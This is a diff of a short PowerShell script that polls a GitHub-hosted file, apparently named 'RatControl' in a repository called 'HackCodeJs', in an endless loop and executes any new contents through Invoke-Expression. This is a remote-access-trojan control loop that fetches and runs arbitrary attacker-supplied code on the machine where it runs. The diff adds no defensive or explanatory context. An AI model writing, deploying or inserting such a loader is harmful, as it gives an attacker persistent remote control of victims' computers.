@@ -1,11 +1,11 @@
-$Com =  (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MrCubeCode/HackCodeJs/refs/heads/main/BatHack.bat')
+$Com =  (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MrCubeCode/HackCodeJs/refs/heads/main/RatControl')
 while ($true) {
-$Com2 =  (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MrCubeCode/HackCodeJs/refs/heads/main/BatHack.bat')
+$Com2 =  (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MrCubeCode/HackCodeJs/refs/heads/main/RatControl')
   if ($Com -eq $Com2) {
       
   }
   else {
   $Com = $Com2
-  iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MrCubeCode/HackCodeJs/refs/heads/main/BatHack.bat')
+  iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MrCubeCode/HackCodeJs/refs/heads/main/RatControl')
   }
 }
